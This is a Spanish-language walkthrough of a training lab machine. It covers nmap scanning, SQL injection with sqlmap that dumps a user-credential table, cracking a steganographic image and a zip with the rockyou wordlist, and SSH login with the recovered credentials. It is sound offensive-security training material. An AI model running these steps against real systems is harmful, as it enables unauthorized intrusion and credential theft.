# MIRAME

## Saber si hay un firewall activo

```Saber si hay un firewall activo
sudo nmap -sA 172.17.0.2
```

## Escaneo de puertos y servicios

```bash
nmap -p- --open -sN -sV --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG tcp_ports
```

## Escaneo de servicios

```bash
nmap -p22,80 -sCV 172.17.0.2 -oN targeted
```

Esta máquina tiene Apache y OpenSSH corriendo, y nos muestra que por el puerto 80 (Apache) tiene corriendo algo con el title "login".

## Ver lo que contiene el servidor apache

```bash
curl -X OPTIONS http://172.17.0.2:80 -i
```

Esto me devuelve el html de la página donde identificamos un formulario de login.

## Intento de envío de credenciales

```bash
curl -X POST http://172.17.0.2:80/auth.php \
  -d "username=admin&password=admin" \
  -i
```

Esto me devuelve un html donde dice que no tengo acceso.

## Detectar si se puede hacer inyección sql

```bash
sqlmap -u "http://172.17.0.2:80/auth.php" --data="username=admin&password=admin" --batch --risk=3 --level=5
```

El resultado nos indica que el parámetro username es vulnerable.

## Enumerar bases de datos

```bash
sqlmap -u "http://172.17.0.2:80/auth.php" --data="username=admin&password=admin" --dbs --batch
```

Vemos que nos muestra una base de datos con el nombre users

## Obtener tablas de la base de datos

```bash
sqlmap -u "http://172.17.0.2:80/auth.php" --data="username=admin&password=admin" -D users --tables --batch
```

Nos arroja que la base de datos users tiene una entidad "usuarios"

## Obtener los datos de la tabla

```bash
sqlmap -u "http://172.17.0.2:80/auth.php" --data="username=admin&password=admin" -D users -T usuarios --dump --batch
```

Obtuvimos en este caso, varios usuarios y contraseñas que podemos probar

## Probar usuarios

```bash
curl -X POST http://172.17.0.2:80/auth.php \
  -d "username=admin&password=chocolateadministrador" \
  -i
```

Nos devuelve:
HTTP/1.1 302 Found
Date: Mon, 07 Jul 2025 23:31:30 GMT
Server: Apache/2.4.61 (Debian)
Location: page.php
Content-Length: 18
Content-Type: text/html; charset=UTF-8

Que nos indica que está logueado el usaurio.

## Probamos capturar las cookies

```bash
curl -c cookies.txt -L -X POST http://172.17.0.2:80/auth.php \
  -d "username=admin&password=chocolateadministrador"
```

Encontramos que esto nos deja en un .php nombrado como "page.php"

## Probamos mandar datos a la página interna "page.php"

```bash
curl -b cookies.txt -X POST http://172.17.0.2:80/page.php -d "city=Bogotá"
```

## Accedemos a la página interna

```bash
curl -b cookies.txt http://172.17.0.2:80/page.php
```

Vemos que en la página interna hay otro input que tiene name "city".

## Vemos si podemos vulnerar dicho input

```bash
sqlmap -u "http://172.17.0.2/page.php" --data="city=bogota" --cookie="PHPSESSID=TU_SESSION_ID" --risk=3 --level=5 --batch
```

## Sin razón aparente probamos si "directoriotravieso" es un directorio en la url

```bash
curl -i http://172.17.0.2:80/directoriotravieso/
```

Y efectivamente me devuelve un archivo xml (html)

## Nos copiamos la imagen

```bash
curl -o miramebien.jpg http://172.17.0.2/directoriotravieso/miramebien.jpg
```

## Analizamos los Metadatos de la imagen

```shell
exiftool miramebien.jpg 
```

```bash
ExifTool Version Number         : 13.30
File Name                       : miramebien.jpg
Directory                       : .
File Size                       : 6.3 kB
File Modification Date/Time     : 2025:07:07 22:21:38-05:00
File Access Date/Time           : 2025:07:07 22:21:38-05:00
File Inode Change Date/Time     : 2025:07:07 22:21:38-05:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 96
Y Resolution                    : 96
Image Width                     : 243
Image Height                    : 207
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 243x207
Megapixels                      : 0.050

```

Parece no tener nada interesante

## Analizamos la imagen por Esteganografía

```bash
steghide extract -sf miramebien.jpg
```

Como nos pide contraseña (Passphrease) debemos usar otra herramienta.

## Primero debemos tener un diccionario de contraseñas

```
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
```

## Extraer datos de la imagen con fuerza usando el diccionario "rockyou.txt"

```
stegseek --crack miramebien.jpg rockyou.txt
```

Nos dejó un archivo "miamebien.jpg.out"

## Validamos qué el type del archivo

```bash
file miramebien.jpg.out
```

```bash
miramebien.jpg.out: Zip archive data, made by v3.0 UNIX, extract using at least v1.0, last modified, last modified Sun, Aug 10 2024 19:43:52, uncompressed size 16, method=store
```

## Ahora sabemos que es un zip, lo podemos descomprimir

```bash
unzip miramebien.jpg.out
```

Al intentar descomprimir nos pide una contraseña

## Necesitamos averiguar la contraseña

```bash
fcrackzip -v -u -D -p rockyou.txt miramebien.jpg.out
```

```bash
found file 'secret.txt', (size cp/uc     28/    16, flags 9, chk 9d7a)


PASSWORD FOUND!!!!: pw == stupid1
```

Al descomprimir el archivo nuevamente usando unzip nos deja un archivo secret.txt

## Ver el contenido del archivo "secret.txt"

```bash
cat secret.txt
```

```bash
carlos:carlitos
```

## Ya que estamos en una máquina de entrenamiento, suponemos que estos datos pertenecen a la conexión con la máquina por ssh

```bash
ssh carlos@172.17.0.2
```

```bash
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:bjdr2CPYHlTnvte+ZhAXAjTvlpsDOicCzoPPqDqG7HQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
carlos@172.17.0.2's password: 
Linux d783ae2e7f36 6.1.4-arch1-1 #1 SMP PREEMPT_DYNAMIC Sat, 07 Jan 2023 15:10:07 +0000 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Aug 10 19:44:14 2024 from 172.17.0.1
carlos@d783ae2e7f36:~$ 
```

